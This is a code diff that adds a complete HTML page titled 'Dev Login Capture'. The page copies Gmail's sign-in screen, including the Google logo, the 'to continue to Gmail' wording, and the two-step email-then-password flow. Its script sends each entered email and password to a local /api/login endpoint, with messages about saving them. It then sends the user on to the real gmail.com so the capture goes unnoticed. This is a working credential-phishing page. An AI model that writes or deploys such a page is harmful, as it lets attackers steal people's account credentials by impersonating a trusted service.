@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Dev Login Capture</title>
+  <style>
+    :root {
+      font-family: system-ui, -apple-system, "Segoe UI", sans-serif;
+      background-color: #202124; /* Gmail dark background */
+      color: #e8eaed;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 20px;
+      background-color: #202124;
+      padding: 24px;
+      box-sizing: border-box;
+    }
+
+    .card {
+      width: min(780px, 95vw);
+      padding: 38px 36px 36px;
+      border-radius: 28px;
+      background: #111111;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.45);
+      border: 1px solid #3c4043;
+      display: grid;
+      grid-template-columns: 1.2fr 1.8fr;
+      gap: 28px;
+      position: relative;
+      overflow: hidden;
+      min-height: 320px;
+    }
+
+    .progress {
+      position: absolute;
+      top: 12px;
+      left: 12px;
+      right: 12px;
+      height: 4px;
+      border-radius: 999px;
+      background: #2c2d30;
+      overflow: hidden;
+      opacity: 0;
+      transition: opacity 140ms ease;
+      pointer-events: none;
+    }
+
+    .progress.show {
+      opacity: 1;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 40%;
+      background: #8ab4f8;
+      border-radius: inherit;
+      transform: translateX(-120%);
+    }
+
+    .progress-bar.animate {
+      animation: loadingBar 1.05s ease-in-out infinite;
+    }
+
+    @keyframes loadingBar {
+      0% {
+        transform: translateX(-60%);
+      }
+      100% {
+        transform: translateX(120%);
+      }
+    }
+
+    .side {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      gap: 6px;
+      transform: translateY(-40px);
+    }
+
+    h1 {
+      margin: 12px 0 4px;
+      font-weight: 500;
+      letter-spacing: 0;
+    }
+
+    .subtitle {
+      margin: 0;
+      color: #9aa0a6;
+      font-size: 0.95rem;
+    }
+
+    .logo {
+      width: 48px;
+      height: 48px;
+    }
+
+    .note {
+      margin: 0 0 20px;
+      font-size: 0.9rem;
+      color: #9aa0a6;
+    }
+
+    label {
+      display: block;
+      margin: 14px 0 6px;
+      font-size: 0.95rem;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px 12px;
+      border-radius: 8px;
+      border: 1px solid #5f6368;
+      background: #202124;
+      color: #e8eaed;
+      font-size: 1rem;
+      box-sizing: border-box;
+    }
+
+    input:focus {
+      outline: 2px solid #8ab4f8;
+      outline-offset: 1px;
+      border-color: #8ab4f8;
+    }
+
+    /* Keep autofill consistent with dark theme */
+    input:-webkit-autofill,
+    input:-webkit-autofill:focus {
+      -webkit-text-fill-color: #e8eaed;
+      box-shadow: 0 0 0 1000px #202124 inset;
+      transition: background-color 9999s ease-in-out 0s;
+      border-color: #8ab4f8;
+    }
+
+    .email-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      padding: 10px 14px;
+      border-radius: 999px;
+      background: #2d3034;
+      color: #e8eaed;
+      font-size: 0.95rem;
+      border: 1px solid #3c4043;
+      margin-top: 12px;
+      min-height: 24px;
+    }
+
+    .email-pill::before {
+      content: '';
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #8ab4f8;
+      display: inline-block;
+    }
+
+    .helper {
+      margin: 0 0 14px;
+      color: #9aa0a6;
+      font-size: 0.95rem;
+    }
+
+    .row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 10px 0 12px;
+      color: #e8eaed;
+      font-size: 0.95rem;
+    }
+
+    .row input[type='checkbox'] {
+      width: auto;
+      height: auto;
+      accent-color: #8ab4f8;
+    }
+
+    .inline-links {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: 10px 0 6px;
+    }
+
+    .actions {
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      margin-top: 24px;
+      gap: 16px;
+    }
+
+    .link {
+      color: #8ab4f8;
+      text-decoration: none;
+      font-weight: 500;
+      font-size: 0.95rem;
+    }
+
+    .link:hover {
+      text-decoration: underline;
+    }
+
+    button {
+      padding: 12px 22px;
+      border: none;
+      border-radius: 20px;
+      background: #8ab4f8; /* Gmail blue */
+      color: #202124;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background-color 120ms ease, transform 120ms ease,
+        box-shadow 120ms ease;
+    }
+
+    button:hover {
+      background: #aecbfa;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.25);
+    }
+
+    button:active {
+      transform: translateY(1px);
+      box-shadow: 0 10px 26px rgba(0, 0, 0, 0.28);
+    }
+
+    .hint {
+      margin-top: 34px;
+      color: #9aa0a6;
+      font-size: 0.9rem;
+      line-height: 1.4;
+    }
+
+    #step-identifier {
+      margin-top: 38px;
+    }
+
+    #step-password {
+      margin-top: 38px;
+    }
+
+    .helper {
+      margin: 0 0 10px;
+      color: #c7cacf;
+      font-size: 0.95rem;
+    }
+
+    .row {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      margin: 10px 0 4px;
+      color: #e8eaed;
+      font-size: 0.95rem;
+    }
+
+    .inline-links {
+      display: flex;
+      gap: 18px;
+      align-items: center;
+      margin: 6px 0 0;
+    }
+
+    .email-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 14px;
+      border-radius: 999px;
+      background: #161616;
+      color: #e8eaed;
+      font-size: 0.96rem;
+      border: 1px solid #3c4043;
+      margin: 10px 0 6px;
+      width: fit-content;
+    }
+
+    .email-pill::before {
+      content: '';
+      width: 9px;
+      height: 9px;
+      border-radius: 50%;
+      background: #8ab4f8;
+      display: inline-block;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .footer {
+      margin: 32px auto 0;
+      width: min(750px, 95vw);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      color: #9aa0a6;
+      font-size: 0.95rem;
+    }
+
+    .footer-links {
+      display: flex;
+      gap: 18px;
+    }
+
+    .footer a {
+      color: #9aa0a6;
+      text-decoration: none;
+      transition: color 120ms ease;
+    }
+
+    .footer a:hover {
+      color: #e8eaed;
+      text-decoration: underline;
+    }
+
+    .lang-selector {
+      position: relative;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      color: #e8eaed;
+      cursor: pointer;
+      user-select: none;
+      padding: 8px 10px;
+      border-radius: 8px;
+      border: 1px solid #3c4043;
+      background: #202124;
+    }
+
+    .lang-chevron {
+      font-size: 0.8rem;
+      color: #9aa0a6;
+    }
+
+    .lang-menu {
+      position: absolute;
+      bottom: calc(100% + 8px);
+      left: 0;
+      background: #202124;
+      border: 1px solid #3c4043;
+      border-radius: 10px;
+      padding: 6px 0;
+      min-width: 220px;
+      box-shadow: 0 16px 40px rgba(0, 0, 0, 0.35);
+      z-index: 10;
+    }
+
+    .lang-menu button {
+      width: 100%;
+      text-align: left;
+      border: none;
+      background: transparent;
+      padding: 10px 14px;
+      color: #e8eaed;
+      font-size: 0.95rem;
+      cursor: pointer;
+    }
+
+    .lang-menu button:hover {
+      background: #2d3034;
+    }
+
+    @media (max-width: 640px) {
+      .card {
+        grid-template-columns: 1fr;
+        gap: 16px;
+        padding: 24px;
+      }
+      .actions {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+      button {
+        width: 100%;
+        text-align: center;
+      }
+    }
+  </style>
+</head>
+<body>
+  <main class="card">
+    <div class="progress" id="progress">
+      <div class="progress-bar" id="progress-bar"></div>
+    </div>
+
+    <div class="side">
+      <svg class="logo" viewBox="0 0 256 262" aria-hidden="true">
+        <path fill="#EA4335" d="M128 55.3c19 0 35.8 6.6 49 19.5L207.6 44C186 23.4 158.9 12 128 12 78.7 12 35.7 40.2 14 82.4l38.5 29.9C63.3 78.5 93 55.3 128 55.3Z"/>
+        <path fill="#4285F4" d="M249.3 130.5c0-7.7-.7-15.2-2-22.5H128v42.8h68c-2.9 15.6-11.6 28.8-24.8 37.8l38.2 29.6c22.4-20.7 35.9-51.2 35.9-87.7Z"/>
+        <path fill="#FBBC05" d="M52.5 151.7c-2.7-8-4.2-16.6-4.2-25.4s1.5-17.4 4.2-25.4L14 71.1C5 88.6 0 108.6 0 130.1s5 41.5 14 59l38.5-29.9Z"/>
+        <path fill="#34A853" d="M128 249.6c32 0 58.8-10.5 78.4-28.9l-38.2-29.6c-10.6 7.2-24.1 11.5-40.2 11.5-30.8 0-56.9-20.8-66.2-48.9l-38.5 29.9C35.7 220 78.7 249.6 128 249.6Z"/>
+      </svg>
+      <h1>Sign In</h1>
+      <p class="subtitle">to continue to Gmail</p>
+      <div class="email-pill hidden" id="email-pill"></div>
+    </div>
+
+    <div>
+      <form id="login-form" autocomplete="off" data-step="identifier">
+        <div id="step-identifier">
+          <label for="email">Email or phone</label>
+          <input id="email" name="email" type="text" placeholder="Email or phone" required />
+
+          <a class="link" href="#" aria-disabled="true">Forgot email?</a>
+
+          <p class="hint">
+            Not your computer? Use Guest mode to sign in privately.<br />
+            Learn more about using Guest mode
+          </p>
+        </div>
+
+        <div id="step-password" class="hidden">
+          <p class="helper">To continue, first verify that it's you</p>
+          <label for="password">Enter your password</label>
+          <input
+            id="password"
+            name="password"
+            type="password"
+            placeholder="Enter your password"
+            aria-label="Enter your password"
+            autocomplete="current-password"
+          />
+          <div class="row">
+            <input type="checkbox" id="show-password" />
+            <label for="show-password">Show password</label>
+          </div>
+
+          <div class="inline-links">
+            <a class="link" href="#" aria-disabled="true">Forgot password?</a>
+          </div>
+        </div>
+
+        <div class="actions" id="actions-identifier">
+          <a class="link" href="#" aria-disabled="true">Create account</a>
+          <button type="submit" id="next-button">Next</button>
+        </div>
+
+        <div class="actions hidden" id="actions-password">
+          <button type="submit" id="password-button">Next</button>
+        </div>
+      </form>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="lang-selector" id="lang-selector" aria-haspopup="true" aria-expanded="false">
+      <span id="lang-value">English (United Kingdom)</span>
+      <span class="lang-chevron">▴</span>
+      <div class="lang-menu hidden" id="lang-menu" role="menu">
+        <button type="button" data-lang="English (United Kingdom)">English (United Kingdom)</button>
+        <button type="button" data-lang="English (United States)">English (United States)</button>
+        <button type="button" data-lang="Français">Français</button>
+        <button type="button" data-lang="Español">Español</button>
+      </div>
+    </div>
+
+    <div class="footer-links">
+      <a href="#" aria-disabled="true">Help</a>
+      <a href="#" aria-disabled="true">Privacy</a>
+      <a href="#" aria-disabled="true">Terms</a>
+    </div>
+  </footer>
+
+  <script>
+    const form = document.getElementById('login-form');
+    const progressEl = document.getElementById('progress');
+    const progressBarEl = document.getElementById('progress-bar');
+    const stepIdentifierEl = document.getElementById('step-identifier');
+    const stepPasswordEl = document.getElementById('step-password');
+    const actionsIdentifierEl = document.getElementById('actions-identifier');
+    const actionsPasswordEl = document.getElementById('actions-password');
+    const passwordInput = document.getElementById('password');
+    const showPasswordEl = document.getElementById('show-password');
+    const emailPillEl = document.getElementById('email-pill');
+    const headingEl = document.querySelector('.side h1');
+    const subtitleEl = document.querySelector('.side .subtitle');
+    const langSelector = document.getElementById('lang-selector');
+    const langMenu = document.getElementById('lang-menu');
+    const langValue = document.getElementById('lang-value');
+
+    let currentEmail = '';
+
+    const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+    function showProgress() {
+      progressEl.classList.add('show');
+      progressBarEl.classList.add('animate');
+    }
+
+    function hideProgress() {
+      progressEl.classList.remove('show');
+      progressBarEl.classList.remove('animate');
+    }
+
+    function switchToStep(stepName) {
+      form.dataset.step = stepName;
+      const isPassword = stepName === 'password';
+
+      stepIdentifierEl.classList.toggle('hidden', isPassword);
+      actionsIdentifierEl.classList.toggle('hidden', isPassword);
+      stepPasswordEl.classList.toggle('hidden', !isPassword);
+      actionsPasswordEl.classList.toggle('hidden', !isPassword);
+
+      if (isPassword) {
+        if (headingEl) headingEl.textContent = 'Welcome';
+        if (subtitleEl) subtitleEl.classList.add('hidden');
+        if (currentEmail && emailPillEl) {
+          emailPillEl.textContent = currentEmail;
+          emailPillEl.classList.remove('hidden');
+        }
+        passwordInput.focus();
+      } else {
+        if (headingEl) headingEl.textContent = 'Sign In';
+        if (subtitleEl) subtitleEl.classList.remove('hidden');
+        if (emailPillEl) {
+          emailPillEl.classList.add('hidden');
+          emailPillEl.textContent = '';
+        }
+        form.email.focus();
+      }
+    }
+
+    form.addEventListener('submit', async (event) => {
+      event.preventDefault();
+
+      const step = form.dataset.step || 'identifier';
+
+      if (step === 'identifier') {
+        const email = form.email.value.trim();
+
+        if (!email) {
+          return;
+        }
+
+        showProgress();
+
+        try {
+          const response = await fetch('/api/login', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ identifier: email }),
+          });
+
+          const payload = await response.json().catch(() => ({}));
+
+          if (!response.ok) {
+            throw new Error(payload.message || 'Failed to save login.');
+          }
+
+          currentEmail = email;
+          await wait(500);
+          switchToStep('password');
+        } catch (err) {
+        } finally {
+          hideProgress();
+        }
+      } else {
+        if (!currentEmail) {
+          switchToStep('identifier');
+          return;
+        }
+
+        const password = form.password.value;
+
+        if (!password) {
+          return;
+        }
+
+        showProgress();
+        const redirect = () => {
+          window.location.href = 'https://gmail.com';
+        };
+        const fallback = setTimeout(redirect, 1200);
+
+        try {
+          const response = await fetch('/api/login', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ identifier: currentEmail, password }),
+          });
+
+          const payload = await response.json().catch(() => ({}));
+
+          if (!response.ok) {
+            throw new Error(payload.message || 'Failed to save password.');
+          }
+
+          form.password.value = '';
+          clearTimeout(fallback);
+          redirect();
+        } catch (err) {
+          redirect();
+        } finally {
+          clearTimeout(fallback);
+          hideProgress();
+        }
+      }
+    });
+
+    if (showPasswordEl) {
+      showPasswordEl.addEventListener('change', () => {
+        passwordInput.type = showPasswordEl.checked ? 'text' : 'password';
+        passwordInput.focus();
+      });
+    }
+
+    function closeLangMenu() {
+      langMenu.classList.add('hidden');
+      langSelector.setAttribute('aria-expanded', 'false');
+    }
+
+    function toggleLangMenu() {
+      const isHidden = langMenu.classList.contains('hidden');
+      if (isHidden) {
+        langMenu.classList.remove('hidden');
+        langSelector.setAttribute('aria-expanded', 'true');
+      } else {
+        closeLangMenu();
+      }
+    }
+
+    if (langSelector && langMenu && langValue) {
+      langSelector.addEventListener('click', (event) => {
+        event.stopPropagation();
+        toggleLangMenu();
+      });
+
+      langMenu.addEventListener('click', (event) => {
+        const button = event.target.closest('button[data-lang]');
+        if (!button) return;
+        langValue.textContent = button.dataset.lang;
+        closeLangMenu();
+      });
+
+      document.addEventListener('click', closeLangMenu);
+
+      document.addEventListener('keydown', (event) => {
+        if (event.key === 'Escape') {
+          closeLangMenu();
+        }
+      });
+    }
+  </script>
+</body>
+</html>
+
